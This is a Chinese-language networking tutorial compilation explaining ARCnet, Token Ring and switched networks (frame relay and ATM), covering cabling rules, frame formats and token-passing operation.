一：各种网络的介绍：
（1）ARcnet简介
（2）Token Ring简介
（3）Switching网络简介
（4）FDDI网简介
（5）ATM网络简介
（6）Ethernet网简介

二：电脑基础知识

三：电脑知识大杂烩

四：OS详解（win9x/2k/xp）

五：功防技术大全

六：网络知识大全


一：（1）ARcnet简介
ARCnet是Datapoint公司1977年开发成功的一种局域网,目前仍具有较大的使用范围,并作为Netware LAN的敷缆系统.ARCnet使用RG-62同轴电缆,而这种电缆刚好与IBM3270终端和IBM主机相连的电缆相同,所以这种网络在大量IBM机的使用基地得到广泛应用.ARCnet现在也可使用双绞线和光纤.新型的ARCnet plus速率已从原来的2.5Mb/s增加到100Mb/s(使用光纤时).这种网络使用的媒体访问法为令牌总线.
ARCnet使用的媒体有同轴电缆和双绞线,它对双绞线要求较低,电话线中多余的双绞线便可作此用途,因为ARCnet仅需要一对线,而且数据速率较低.然而,最好不要使用这种方式,因为当你要升级到也使用双绞线的其它技术时会产生问题.

一、ARCnet 的构件 
在构造ARCnet网络时,所用关键硬件设备有两种:其一是有源Hub,其二是无源Hub.所谓有源Hub是指一种设备,可对网络信号进行分裂信号加以分裂.它无放大功能,不需要电源,只是将信号加以分裂.正因为无放大功能,无源Hub的电缆长度远不如有源Hub.这是ARCnet网络构成时的主要构件.除Hub外,第二种构件是ARCnet网卡,通常能以同轴电缆和双绞线两种方式之一进行工作.当同轴电缆卡要联接到双绞线网络时,必须使用一种称作banlun的设备,这是一种小型设备,可将同轴电缆联接器转换为双绞线联接器.第三种构件是93Ω的终结器。使用同轴电缆时,任何不用的无源Hub端口或电缆都要用终端器终接;使用双绞线时,终接器插入位于电缆末端的网卡上.

二、ARCnet 的网络结构 
ARCnet布缆方式有两种:一种是总线型,另一种是星型总线型.下面分别介绍这两种类型的ARCnet.

1.总线结构

总线结构与Ethernet细缆方式相类似,如图1所示.ARCnet总线最大长度为305m,可联接的设备最多8个.设备与总线的联接通过T型联接器,该联接器的顶部与电缆相连,底部与网卡相连.电缆两端必须用93Ω的电阻终结.

以上是使用同轴电缆的情况,如果使用双绞线,上述规定会有一定变化.在这种情况下使用菊链结构，即适合双绞线媒体的网卡有两个端口:一个用于连接服务器,另一个用于连接下一个PC机.如此级链时最多可连接10个PC机,双绞线最大距离不超过122m(400英尺).第一个网卡和第二个网卡都必须用93Ω终接器终接.

2.星形总线结构

这种物理布线是以Hub为中心,形成一种多星形互连在一起的结构，如图2所示.这种结构之所以称为总线是由于所有工作站共享公共电缆.

这种结构可使用电缆,也可使用双绞线.在使用电缆时,星形总线通过使用Hub分裂信号来形成.Hub可以是有源的,也可以是无源的.如果使用有源Hub,有源电缆变插入其端口之一,其余的端口连接工作站.工作站与有源Hub的最大距离为610m(2000英尺).当使用双绞线时,需要使用有源Hub,Hub与文件服务器相连，工作站也与其直接相连.在这种方式下,服务器或工作站与有源Hub之间的距离最大可为1220m(4000英尺).网卡上不用的端口必须用93Ω的终接器短接.

三、ARCnet布线规则 
ARCnet可以多种方式配置,因此,这里只能给出典型使用情况下的方法.由于使用双绞线
和同轴电缆有不同的规范,因此布线规则将分别加以说明.然而,不管使用那种媒体,ARCnet
应遵循下述通用规则:
　 ① 有源Hub可以连接到其它有源Hub或无源Hub,也可连接到工作站.
　 ② 无源Hub可连接到有源Hub和工作站,但不能直接连接到其它无源Hub.
　 ③ 在ARCnet中不能形成环路.所谓环路是指一根电缆出自某一Hub,经其它Hub,最后又连
　　　回到起始Hub.
　 ④ 必须对无源Hub不使用的端口进行终接.
　 1.ARCnet同轴电缆总线设计规则
　 ARCnet使用总线结构时,在305m(1000英尺)的最大距离上使用RG-62型电缆最多可级连8个
工作站.在总线结构下,使用T型连接器连接工作站,一个总线段必须用93Ω的终接器在两端加
以终接.
　 ARCnet同轴电缆可与有源Hub提供的星型结构相结合.在这种情况下,总线一端连接到有源
Hub上.一个8端口的有源Hub可连接的工作站总数为8X8=64.?如果要连接两个有源Hub,每个有
源Hub的一个端口可用来连接有源Hub,?那么每个有源Hub?可支持56个工作站,两个有源Hub则
可支持112个工作站.表1为同轴电缆总线的配置规范. 
表1　　　ARCnet同轴电缆规范
参 数　　规范
电缆类型RG-62
电缆物理布局星型总线
最大节点数254
最大有源Hub数每有源电缆一个
有源Hub和节点间的最大距离610m(2000英尺)
有源Hub和无源Hub间的最大距离30.5(100英尺)
无源Hub和节点间的最大距离30.5(100英尺)
数据传输速率2.5Mb/s


　2.ARCnet双绞线总线设计规则
　　首先指出,使用双绞线在功能和逻辑上都有等价于同轴电缆总线.用于双绞线的
网板备有两个6插针的模块化插座,用来菊链ARCnet网板,最大可菊链10个工作站,长
度不超过122m(400英尺).工作站之间的最小间隔为1.8m(6英尺).
　　双绞线结构可与有源Hub提供的星型拓扑结构组合,将总线的一端连接到有源Hub
便可进行这种组合.表2示出了ARCnet双绞线规范.
　表2　　　　 ARCnet双绞线规范 
参数规则
电缆类型双绞线
电缆物理结构星型总线
最大节点数254
最大有源Hub数10
有源Hub和节点间的最大距离122m(400英尺)
数据传输速率2.5Mb/s


四、ARCnet的操作 
ARCnet LAN 的站传输像总线型LAN一样是广播式的,但对总线的访问决定于令牌.为
说明这种网络的操作机制,假定在一条总线上有4个节点,其地址分别为1,10,25和255.
　 在启动网络时,这四个工作站形成一个逻辑环.每个站都跟踪两个信息:
　 ?谁是后继者;
　 ?谁是前驱者.
　 这两种信息分别由字母S(后继者)和P(先驱者)代表.一个工作站的后继者定义为逻辑
环上具有较高地址的站;先驱者则定义为逻辑环上具有较低地址的站.
　 在ARCnet中,站地址0用于广播地址,因此最小站地址为1,最大站地址为255.在构成逻
辑环时规定,工作站地址为255的后继站地址为1，站地址为1的前驱站地址为255.工作站
前驱者和后继者的地址如表3所示. 

　表3　　　　工作站的前驱站和后继站地址
工作站地址前驱工作站地址(p)后继工作站地址(s)
125510
10125
2510255
255251


　 1.ARCnet 帧结构
　 像Ethernet一样,ARCnet传输单位也称为帧.帧结构如图3所示.图3(a)所示为邀请发送
(ITT)令牌帧总是传递给它的后继工作站.
　　　　
　(a) ITT帧　
ALERT EOT DID DID 

　　　　
　　　　
　(b) FBE帧　　　　 
　
ALERT 

ENQ 

DID 

DID 

　(c) ACK帧 
　
ALERT 

ACK 

　(d) NAK帧 
　
ALERT 

NAK 

　(e) PAC帧 
　
ALERT 

SOH 

SID 

DID 

DID 

CP 

DATA 

CRC 

CRC 

　 ARCnet帧不管是哪种帧,都由ALERT引导,类似于Ethernet中使用的前导码(见本刊今年
第3期的局域网技术系列文章3).ALERT由6比特间隔的传号(1)组成.传号(1)由正脉冲后跟
负脉冲组成的双脉冲表示.空号(0)由无脉冲表示.EOT是ASCII码中的传输结束控制符(04hex).
后跟的两个字节都是DID(终点标识符)，即后继工作站的信息.重复使用DID的目的是增加
可靠性.
　 图3(b)是空闲缓冲器询问(FBE)帧.ENQ是ASCII字符集中的询问字符(05hex).它后跟的
两个字节DID是想通过询问了解空闲缓冲器状态的工作站标识.DID重复使用也是为提高寻
找终点工作站的可靠性.
　 ACK(确认)帧由ALERT和ACK组成.ALERT的构成前面已有叙述,ACK是ASCII字符集中的确
认字符(06hex).当响应FBE帧而发送ACK时,表示接收工作站具有可供使用的缓冲器空间.
ACK帧所以没有DID字段,是因为这种帧是作为广播方式发送的。ACK帧如图3(c)所示。NAK
(否认)帧如图3(d)所示.NAK是ASCII字符集中的否认字符(15hex).当响应FBE帧而发送NAK
时，表示接收工作站不具有可供使用的缓冲空间.NAK帧也没有DID字段,其原因与ACK帧相
同.
　 图3(e)所示为数据帧。帧中SOH(标题开始)是ASCII字符集中的标题开始字符(01hex)。
SID(源点ID)和(终点ID)表示源点和终点工作站的地址.CP(连续指针)字段指示工作站在存
储器中找到的传输数据的起点.数据字段DATA具有可变长度,处于1字节和508字节之间，用
以携带用户数据.2字节的CRC字段由发送站添加,用来保护Data字段.
　2.操作过程
　　在启动时,首先要构成逻辑次序,即逻辑环，每个站都不断跟踪保持其前驱工作站和后
继工作站的站标识.关于前驱和后继工作站的规定如表3所示，每个工作站将其自身的后继
者(NID)设置为自身站地址(ID)加1,并按下述公式设置超时值
　　　(TimeOutt):
　　　TimeOut=146X(255-ID)μS
　 具有最大地址值的工作站首先超时,于是它创建ITT帧,并将该令牌帧发送给它的后继站.
如果在74us后没有响应,最大地址值的工作站便认为具有后继NID地址的站不存在，随后便
将NID值增加1,再次发送DID为新值的ITT.这种过程重复直至该最大地址值的工作站找到自
己的后继者为止.被找到的后继工作站像前驱工作站一样,重复此过程.
　 一旦找到所有活动工作站,正常的令牌传递操作便可开始.配置时间在24到61us范围,取
决于活动站的数目和工作站地址的值.为使TimeOut初始值为0和将配置时间减至最小,至少
将ARCnet一个工作站地址设置为255.
　　具有ITT帧的工作站在将令牌帧传递给后继站之前最多发送一帧.在数据帧被发送到终
点节点之前,必须询问是否有足够的缓冲空间来接受帧.执行这种询问功能的是FBE帧.被询
问的站如果有缓冲器可用,便发回ACK帧,否则发回NAK帧.
　 发送FBE帧后一旦收到ACK帧,便可发送数据帧PAC.
　 如果因为故障破坏了令牌的正确传递,网络必须进行重新配置。产生另一种重新配置的
情况是在令牌传递环上增加工作站或去掉工作站.因此重新配置是难以避免的事情.
　 如果一个活动工作站在840ms后未接收到ITT帧,由8个传号间隔组成的RECON图样,
后跟一个空号便发送765次.RECON图样持续2754us,以确保破坏传输中的任何令牌帧，其结
果是使令牌帧丢失.78us无活动后,所有工作站都会认识到,重新配置正在发生.于是每个站
都将其自身的后继者设置为自身地址(ID)加1,并设置超时值.以后的过程与启动时一样.
　 在ARCnet技术中,删除一个工作站是一个较简单的过程,不需调用全部重新配置机制.如
果地址为10的工作站从环上已撤离，而且只要对其前驱者工作站1发来的ITT帧不响应的时
间超过74us.工作站1便认为工作站10不再存在.工作站1便对其NID值增加1(新值为11)，并
将ITT发到工作站11.如果在74us后还是没有响应,则重复上述过程.下一个站地址为25，工
作站1需要(25-10)X74us=1.1ms的时间,才能发现它的后继工作站为25.
　　如果工作站10想重新进入环,它必须等待令牌的时间为840ms.如果它还未经过ITT帧被
邀请发送,它必须调用全部重新配置机制.
五、ARCnet plus
ARCnet plus是ARCnet的第二代产品,比ARCnet性能有显著提高,单从传输速率看,提
高到原来2.5Mb/s的8倍,即20Md/s,而且还与ARCnet向下兼容.
　 　要了解性能提高的机制，必须清楚ARCnet传递速率低的原因。ARCnet的工作站使用
5MHz的一个周期后跟等长的静止期来表示逻辑"1".逻辑"0"则由两个静止间隔组成。一个
间隔是1/5MHz=200ns.由此可看出,发送1比特(0或1)信息需要两个这样的间隔.
　　ARCnet以多个整数个字节发送数据,每一字节由3比特较准图样(110)来使接受器与发
送器同步.这表明每8个数据比特就有3比特的额外开销,因此,ARCnet的有数据速率为8/11
×25Mb/s=1.82Mb/s。显然对带宽有较大的浪费.静止期是一种浪费,较准额外开销占总带
宽的27%.
　 ARCnet plus增加带宽利用效率通过下述二种途径实现:
　 ?消除静止周期;
　 ?将每个字节使用3比特较准比特改为每8个字节使用3比特较准比特.
　 ARCnet plus使用的精巧技术是使用幅度调制在每200ns间隔中挤出4比特信息.脉冲可
以是正的或负的正弦波,具有从0到12V的8个可能的幅度,从而给出总数为2X8=16的脉冲组
合,足以代表4比特的数据.
　 因此,ARCnet plus的数据速率为4比特×5M脉冲/秒=20(Mb/s).然而这个数据率未包括
额外开销,如果考虑较准所用的额外开销,其有效数据率为16.8Mb/s.
　 在ARCnet plus初始化期间,一个工作站发送一特殊信号,通知其它站要以ARCnet plus
的高速方式操作.当工作站传递令牌时,也发送这种特殊信号.当ARCnet plus工作站与
ARCnet工作站通信时,则要降至2.5Mb/s.
（2）Token Ring简介
令牌环是IBM公司于80年代初开发成功的一种网络技术。 之所以称为环，是因为
这种网络的物理结构具有环的形状。环上有多个站逐个与环相连，相邻站之间是一种
点对点的链路，因此令牌环与广播方式的Ethernet不同，它是一种顺序向下一站广播
的LAN。与Ethernet 不同的另一个诱人的特点是，即使负载很重，仍具有确定的响应
时间。令牌环所遵循的标准是IEEE802.5，它规定了三种操作速率：1Mb/s、 4Mb/s和
16Mb/s。开始时，UTP 电缆只能在 1Mb/s的速率下操作，STP电缆可操作在 4Mb/s和
16Mb/s，现已
有多家厂商的产品突破了这种限制。
　　本期将通过以下八个部分介绍令牌环网的基本知识：
一、令牌环网的物理结构
令牌环的基本结构如图1（a）所示，工作站以串行方式顺序相连，形成一个封闭的环
路结构。数据顺序通过每一工作站，直至到达数据的原发者才停止。图1（b）是基本环形
结构的改进型，在此结构中，工作站未直接与物理环相连，而是连接到一种多站访问单元
（MAU），称为IBM8228。MAU可连接8个工作站。
　　构成令牌环物理结构的传输媒体有屏蔽双绞线（STP）和无屏蔽双绞线（UTP）。
　　　　 
　　　　　图1（a）　　　　　　　　　　　　　　　图1（b）

二、令牌环网的组成部件
从令牌环物理结构可以看出，组成令牌环网需要的主要部件包括：1、网卡；2、多站访
问单元（MAU）；3、传输媒体；4、连接附件。
　　网卡是计算机连入网络的必备硬件，制造令牌环网卡的厂商很多，选购时首先要弄清所
适应的总线以及要安装在具有何种总线的计算机上，例如，对于 ISA总线的工作站，适用的
网卡有：
　　．IBM Token-Ring PC Adapter
　　．IBM Token-Ring 16/4 Adapter
　　．IBM Token-Ring PC AdapterⅡ
　　．3Com TokenLink Ⅲ 16/4-3C619
对于具有微通道结构的PC机，适用的网卡有：
　　．IBM Token-Ring PC Adapter/A
　　．IBM Token-Ring 16/4 Adapter/A
　　．IBM Token-Ring 16/4 Busmaster Server Adapter
　　．3Com TokenLink Ⅲ 16/4-3C629
　　MAU在令牌环网络中类似于集线器或集中器。最常用的MAU为IBM8228，可连接8工作站，
MAU的两个末端端口分别称为RI（入环）和RO（出环）端口，不能用来连接工作站，而是用
于MAU的互连，如图2所示。在使用屏蔽双绞线条件下的一个网络上可连接260个工作站。
图2
令牌环网所用的媒体最初是150Ω的屏蔽双绞线（STP）。目前除这种媒体外，通过使用
无源滤波设备也可使用100Ω的无蔽双绞线（UTP）用以实现4Mb/s和16Mb/s 的传输。由于这
种网络技术是IBM公司发明的，所以令牌环用的媒体通常是经过IBM认证的、并按照TypeX加
以编号。
　　Type1,Type2,Type6和Type9在令牌环网络中都可使用,但使用地点不同。Type1,Type2，
Type9可用于连接MAU和信息座；Type6可用于连接适配器（网卡）。用于令牌环的UTP最好是
第4类双绞线。
三、令牌环的构造规则
根据IEEE802.5确定的规范，在规划令牌环网络时应遵循下述通用规则：
　　１、工作站距MAU应处于2.4m（8英尺）范围内，并可使用2.4m（8英尺）长的网
卡电缆相连。
　　２、当工作站与MAU之间的距离大于2.4m（8英尺）时，可使用扩充的软线相连。
　　３、为将多个MAU构成环形，使用软线电缆将第一个MAU的RO（出环)连接到第二
个MAU的RI（入环）。依此方式逐个相连，直至最后一个MAU，并将最后一个MAU的RO
连接到第一个MAU的RI。
　　４、工作站绝不能连接到RI和RO端口，RI和RO的作用是互连MAU。
　　５、MAU互连电缆（Type6）不能拼接。
　　６、MAU与MAU间的距离要根据所用电缆类型。MAU的数目等参数来确定。
　　除遵循这六项通用规则外，电缆敷设的规则随UTP或STP以及设备的不同而异。附
表示出了敷设STP和UTP电缆的规范。


附表　　　　　　令牌环网的规范 
令牌环网的双绞线类型永久安装的 
STP电缆小型可移动 
STP电缆UTP电缆
MAU之间的电缆类型TYPE1或 
TYPE2TYPE1或 
TYPE2TYPE1
跳线面板和信息座间的 
电缆类型同上同上TYPE3
跳线电缆的电缆类型TYPE6TYEP6TYEP3
网卡电缆类型TYPE6TYPE6TYPE3加 
媒体滤波器
电缆连接结构星形环星形环星形环
最大节点数目260个96个72个
最大MAU数目33个12个9个
两个MAU的最大间隔100m 
(330英尺）45m 
(150英尺)　
MAU和节点之间的 
最大距离100m 
(330英尺)45m 
(150英尺)45m 
(150英尺)
数据传输速率4Mb/s 
或16Mb/s4Mb/s 
或16Mb/s4Mb/s
四、令牌环网的操作原理
令牌环网的操作原理可用图 3来说明。当环上的一个工作站希望好送帧时，必须首先
等待令牌。所谓令牌是一组特殊的比特，专门用来仲裁由哪个工作站访问网环。一旦收到
令牌，工作站便可启动发送帧。帧中包括接收站的地址，以标识哪一站应接收此帧。帧在
环上传送时，不管帧是否是针对自己工作站的，所有工作站都进行转发，直到待回到帧的
始发站，并由该始发站撤消该帧。帧的意图接收者除转发帧外，应针对自身站的帧维持一
个副本，并通过在帧的尾部设置“响应比特”来指示已收到此副本。
　　工作站在发送完一帧后，应该释放令牌，以便出让给它站使用。出让令牌有两种方式，
并与所用的传输速率相关。一种是低速操作（4Mb/s?）时只有收到响应比特才释放，我们
称之为常规释放。第二种是工作站发出帧的最后一比特后释放，我们称之为早期释放。
　　现在就图3进行一些说明，开始时，假定工作站A想向工作站C发送帧，其过程如图3所
标出的序列。
　　第1步：工作站A等待令牌从上游邻站到达本站，以便有发送机会。

　　第2步：工作站A将帧发送到环上，工作站C对发往它的帧进行拷贝，并继续将该帧转
发到环上。

　　第3步：工作站A等待接收它所发的帧，并将帧从环上撤离，不再向环上转发。

　　第4步a：当工作站接收到帧的最后一比特时，便产生令牌，并将令牌通过环传给下游
　　　　　　邻站，随后对帧尾部的响应比特进行处理。
　　第4步b：当工作站A发送完最后一个比特时，便将令牌传递给下游工作站，所谓早期
　　　　　　释放。

第4步分a、b两种方式,表示选择其中之一。如前所述，在常规释放时选择第4步a，在
早期释放时选择第4步b。还应指出，当令牌传到某一工作站，但无数据发送时，只要简单
地将令牌向下游转发即可。
五、环接口
网板与媒体的连接通过接口电缆和干线耦合单元（TCU)实现，如图4所示。TCU由一
组继电器和电子线路组成，用来与电缆形成收发通路。继电器的使用结构要使工作站在
不加电情况下，TCU处于旁路状态，维持环的连续通路。TCU?的结构如图4所示。图中左
侧为工作站不加电时的旁路方式,右侧为工作站在环方式。工作站入环是在MAC单元控制
下通过对继电器的激励来实现的。在工作站插入环的条件下，接收的所有信号都进入网
板中的MAC单元,由该单元中的接收／发送电子线路对接收的信号进行读取，并将接收的
信号转发到发送侧（当该工作站不是帧的发起者时），或将接收的信号从环上撤离（当
该工作站是帧的发起者时）。



　　上述方式使用两对继电器意味着 MAC单元可以检测发送线对或接收线对有无开路和
短路故障。在旁路状态下，MAC单元可进行自测试功能，因为发送线对TxD的输出可返回
到接收线对。
　　MAC单元的主要功能是：
　　．帧的封装和解封装；
　　．FCS（帧检验序列）的生成；
　　．差错检验；
　　．媒体访问控制算法的实现；
　　．向环提供主时钟；
　　．对发送的比特流进行曼彻斯特编码；
　　．确保环具有小的时延。
　　环的时延是指信号绕环一周所需的传播时间，其单位为环数据传输速率下的比特时
间。环的时延包括信号传播时间与经过每一 MAC单元的传播时间之和。当环上所有工作
站都不使用环时，令牌绕环连续传输最小时延至少是令牌序列的比特数时间，以确保令
牌不受损坏。
六、MAC帧格式
令牌环上传输的数据格式（帧）有两种：一种是令牌，另一种是常规帧。令牌是占有发
送权的标志，占有令牌的站才能发送。常规帧用来发送数据或控制信息。两种帧的格式如图
5所示。

SD=帧首定界符Ｉ＝信息字段
AC=访问控制FSC=帧检验序列
FC=帧控制ED=帧尾定界符
DA=终点地址FS=帧状态字段
SA=源点地址
图5

　　帧首定界符(SD)和帧尾定界符（ED）字段分别是一种专门标志帧首和帧尾的特殊字段，
段1个字节。为了使用户数据获得透明性，应采取某种机制，使信息字段不会出现与SD或ED
相同的比特序列。在令牌环网中所用的机制是除SD和ED字段外,其它所有信息比特都使用曼
彻斯特编码，也就是说通过不同的编码方法来获得专门的标志。从图5的字段描述可知，要
作到这一点，J.K符号必须与常规编码规则不同，即J符号与其前面的符号具有相同的极性，
K符号与前面的符号具有相反的极性。使用这种方式，接收机便可可靠地鉴别帧或令牌帧的
开始和结束。
　　访问控制(AC)字段由优先权比特（P）、令牌（T）和监视（M?）比特以及保留比特(R)
组成。由该字段的名字可知，基功能是控制对环的访问。在其出现在令牌帧时，P比特表示
令牌的优先权，因此指示工作站收到该令牌后便可发送那些帧。T比特用来区分令牌帧和常
规。 M比特由活动监视器用来防止帧绕环连续散发。R比特用来使工作站指示高优先权帧的
请求，请求发出的下一个令牌具有请求的优先权。
　　 帧控制（FC）字段定义帧的类型和控制功能如果帧类型（F）指示MAC帧，环上所有工
作站都对其接收和解释，并根据需要对控制比特（Z）进行动作。如果它是工帧，控制比特
公由终点地址字段标识的工作站解释。
　　 源点地址（SA）和终点地址（DA）字段可为16比特或48比特。对于特定的令牌环网，
应有一致的地址长度。DA标识帧意图发往的工作站,可以是一个站或多个站。源点地址(SA)
字段表示发送该帧的站。
　　 信息（I）字段用来载携用户数据或附加控制信息。I字段中最大长度虽无限制，但由
于允许DTE发送帧时有时间限制，所以也就限制了I字段的长度，通常最大值的5000个字节。
　　 帧检验序列（FCS）是32比特的循环冗余检验用来检验FC，DA，SA和I各字段在传输中
有无差错。最后一个字段为帧状态（FS）。FS由两个字段组成：地址识别比特（A）和帧拷
贝比特（C）。如果该帧要由一个或多个工作站识别，则将A比特置为1。如果它拷
贝了该帧，便将C比特置1。使用这种方法，发起工作站可了解下述状态：
　　．被寻址的工作站是否存在或关闭；
　　．被寻址的工作站在工作，但未拷贝帧；
　　．被寻址的站工作且拷贝了帧。
七、令牌环网的帧收发操作
帧的发送和接收所遵循的规则称为MAC算法。为了简化和易于理解其基本操作，下面
的过程不考虑优先权机制。
　　１、帧的发送
　　MAC单元收到发送数据请求后，首先将数据封装为MAC帧，参见图5所示。?随后，MAC
单元等待令牌到来。如果到来帧的AC字段中的T比特为“0”，?则表明令牌已到，并通过
将T比特置“1”来抓住令牌，随后将其余字段FC，DA，SA，I，FCS，ED和FS（见图5）添
加在AC字段后,形成一个完整的帧发送到环上。同时被抓住的令牌帧中的ED字段被该站吸
收。抓往令牌的站可连续发送直至无数据可发,或令牌保持计时器期满为止。该站可通过
将ED字段中I比特置1的方法连续发送多个帧（多帧中的最后一帧除外）。
　　发送出帧的工作站要负责清除绕环一周回至源发点的帧,并检查帧ED和FS中的状态比
特，判断传输的结果。值指出的是，如果状态表明有错，MAC并不重传，而是向高层报告，
发送过程图解见图6。


图6
　　２、帧的接收
　　令牌环上的工作站除对进入的信号转发外，通过识别帧首定界符SD来监视帧的开始。
如果FC字段中的F比特指示它是MAC帧，便对其进行拷贝，并对FS?字段中的C比特进行解释，
并按需要进行动作。如果该帧为常规的数据载携帧，并与该接收站的地址符合，帧内容将
拷贝到帧缓冲器，以便进一步处理。?在任何一种情况下，?FS字段中的A和C比特都要在转
发前根据情况进行设置。接收过程的流程图如图7?所示。




八、优先权和环的管理
前面所描述的发送和接收帧的过程是一种简化了的基本方式，在令牌环LAN?的标
准IEEE802.5中，还引入了优先权机制，旨在确保：
　　．优先权高于当前环服务的优先权的帧能首先发送到环上；
　　．当数据站保存的帧具有相同的优先权时，这些数据站对环的访问有相等的权力。
　　优先权是通过AC字段中的P和R比特来实现的。对具体实现机制有兴趣的读者可查
阅IEEE802.5标准。
　　在令牌环正常操作之前，首先要进行建立。如果一个工作站希望加入业已运行的
环，也必须先经过初始化过程，才能保证在入环时不影响原来环的操作。此外，在正
常操作期间，环上每个活动工作站还必须监视其正确操作。如果出现故障，必须采取
纠正动作，以维持环的正确操作。从总体上来说，这些功能都属于环的管理范畴。不
难看出，令牌环网络使用的媒体访问控制机制是很复杂的，所幸的是大部分规程都可
使用特殊的集成电路芯片实现，其操作细节上对用户是完全透明的，又考虑到令牌环
网络市场远比Ethernet小得多，所以，这里也就不再进一步描述了。
（3）Switching网络简介
随着多媒体通信以及客户／服务器(Client/Server)体系结构的发展， 网络传
输变得越来越拥挤，传统的共享LAN难以满足用户需要，曾经采用的网络区段化， 
由于区段越多，路由器等连接设备投资越大，同时众多区段的网络也难于管理。
　　当网络用户数目增加时，如何保持网络在拓展后的性能及其可管理性呢？网络
交换技术就是一个新的解决方案。
　　传统的共享媒体局域网依赖桥接／路由选择，交换技术却为终端用户提供专用
点对点连接，它可以把一个提供“一次一用户服务”的网络，转变成一个平行系统
，同时支持多对通信设备的连接，即每个与网络连接的设备均可独立与换机连接。 
　　一、两种网络交换技术
1.帧交换技术
　　传统的以太网和令牌环网在逐级链路的传送交换过程中，包含执行链路协议设
备和网络层协议的大量运算操作。随着光纤的普及和网络传输速度与质量的提高，
为了使网络的每个传送环节上通信协议简化，提高通信效率，产生了帧中继交换技
术。
　　帧中继开始是在ISDN标准化过程中在I.122协议中提出来的，它保存了X.25 链
路层HDLC帧格式，但不采用LAPB规程，而按照ISDN标准使用独立于用户数据信道的
呼叫控制信令，即LAPD规程，在链路级(帧级)实现交换(X.25在网络层实现)。 图1
为LAPD和LAPB两种帧格式的比较。
　　在帧中继网内，帧的长度是可变的，最大长度可达1000字节以上，每帧含有“
数据链路连接标识符”，从源点DTE到终点DTE之间所有途径的结点根据此标识符指
明信道。当FCS校验发现有错时，分组即被丢弃并由终点和源点设备间负责检错重
图1 
发。帧交换类似于路由器／桥接器，在工作站或网络区段之间传递以太网或令牌环网，只需要一个以太网或令牌环接口，帧交换器便可与任何网络设备连接( 如个人机、工作站、集线器等)，无须再配置接口。帧交换器可以辨认每个终端站的地址，当收到信息以后，便会审查其终点MAC地址，然后把信息包前送至终站上拥有相同MAC地址的输出端口。该输出端口可直接与终端站连接，或连接多个用户的公共区段，或另一个与终端站连接的交换器。
　　2.ATM交换技术
　　ATM(即异步传输模式)交换称为信无交换， 它是在光纤大容量传输媒体的环境中分组交换技术的新发展。ATM中把数字化的语音、 数据及图像信息分成固定长度的若干段，称为信元，由用户信息字段和信元头组成，如图2。信元数据根据信源动作按需分配。同一个虚信道上的信元整体性由ATM层保持， 而源信号与信元号之间由适配层来控制。
图2
ATM技术与帧交换之间主要有两大区别：第一，ATM交换由53字节组成的固定长度的信元，不同于帧中继技术交换长度不一的以太网和令牌环帧。第二，ATM 传送速度更高，可在155至622Mb/s之间，适合于B-ISDN的多种业务信号混合传输，而帧中继属于局域网与广域网的通信范围。　　可延展性是ATM交换技术的内在特点。当有终站加进ATM交换时，交换机制便自动扩张以适应需要，使每个终站都获得一条通道(即专用带宽)。　　由于ATM所传送的信元长度固定，ATM交换速度比一般路由器快。因此，ATM 技术实现的通信网可支持语音、数据以及图像传送，提供专用高带宽以及可预测性能
，适合企业局域网使用，并可直接支持多媒体计算机。
　　二、交换技术的优点
由于交换机提供与工作站的专有连接，所有连接设备均可获得10Mb/s以太网或16Mb/s令牌环带宽。专用连接加上交换技术使网络设备以适合个别设备的数据速度与交换机连接。比如一个连同一个服务器的以太网工作组连接到建筑物的中枢链路，用户计算机可通过专用10Mb/s以太网与交换机连接，而与服务器与中枢链路的连接可支持100Mb/s快速以太网， 由于交换机为每个终站提供专用连接，所有用户均可相互发收信息而不会发会碰撞。以100Mb/s 速度与服务器及中枢链路连接使每个使用100Mb/s的用户，可同时存取资源而不会产生拥挤。
　　交换技术的最大好处是帧交换及信元交换均可与现有的共用媒体局域网一同动作。共用媒体局域网在网络连接性能要求不很高以及用户较分散的环境里十分适合。
　　帧交换通常用作网络共用媒体区段间的高速互连，或在工作组层提供与高性能工作站及服务器的专用连接。交换式100Mb/s 快速以太网更可提供与工作站服务器、中枢链路网络集线器之间更高带宽的连接。
　　ATM信元交换器通常放置在带宽要求非常高及可延展性的网络中心。 在一个大园区中心，ATM交换器将互连数个单元交换器、集线器、服务器、 帧交换机及路由器，并同时与ATM广域网连接。
　　帧交换与信元交换技术可在工作组与中枢链路间联合使用，把以太网及令牌环帧转变成固定长度ATM信元的过程称为“自适应”，也即把不同长度的信息包分割至较小的信息包，然后再组合成ATM信元， 这个过程可在网络上的任何部分进行。
　　三、交换式互连网的发展
如今的网络模式大部分是基于IEEE802.3以太网和IEEE802.5令牌环网的共享介
质LAN互连，通过桥接／路由器，共享LAN上的所有终端站接收所有的传输帧，忽略
不是自己的那些帧。
　　采用交换式互连技术可动态地为终端站增加网络容量，实现独占LAN 在这种情
况下，今天的IEEE802.3 和IEE802.5共享LAN在终端站和Hub间将作为点对点协议使
用。在独占LAN中，Hub的集中器模块实际是多端口接力器，它们代替了多端口网桥
和路由器，能够以LAN的线速度进行快速帧交换，为所有的终端口服务， 采用这种
模式，共享LAN变成独占LAN，其优点的于它具有潜力给每个终端以独占的10Mb/s容
量，而无须对终端机和网卡作任何变动。
　　通常网络的主干网有两种设计：集中式和分布式。集中式的主干网将所有楼层
的LAN连到单个的交换机，它的总线成为主干网。它使用现有的LAN 技术， 如通过
Hub将以太网同主干网路由器相连。分布式主干网以比较对等的形式互联楼层， 使
用较快的主干网互连所有Hub，基于Hub的lan被桥
接或路由器连到主干LAN上，这样没有中心路由器，路由被分解了。采用FDDI 这样
的共享LAN分布式主干网要求在每个楼层都设有网桥或路由器， 而集中式主干网集
中了LAN的互联功能。
　　随着交换式LAN成为智能Hub的基础，使用交换技术将成为主要的设计问题，某
些Hub厂商正将包和帧交换用作硬件和固件处理，或是将进入Hub的帧换成信元，然
后让信元交换，以获得大的交换容量。
　　在未来的交换式互连网发展中，今天的集中式主干网路由器将由信元交换代替
。然而这并不意味着数据包路由器的淘汰，它们将被做进智能Hub中实现LAN间的互
联以及同信元交换主干网的互联。在过渡的信元交换期间，路由和桥接将用于互联
数据包领域及正在增长的信元交换领域。
　　作为一种商业开发技术，网络交换技术还面临许多问题，例如阻塞与流量控制
、交换效率与生产成本、带宽节省等。
　　从管理角度上，交换技术产生一个新的概念：虚拟局域网。虚拟局域网是各终
端站组合而无须经路由器也可直接通信，是用户与相关资源的逻辑组合，交换式虚
拟网络是一个通过在不同的LAN网段上的节点之间建立高速的交换连接来消除LAN的
物理拓扑结构所固有的阻塞的一种技术。交换是指提供所需要的高速度，虚拟是指
用逻辑智能来构造网络，以取代实际的物理连接，并保证网络的稳定性和安全性。
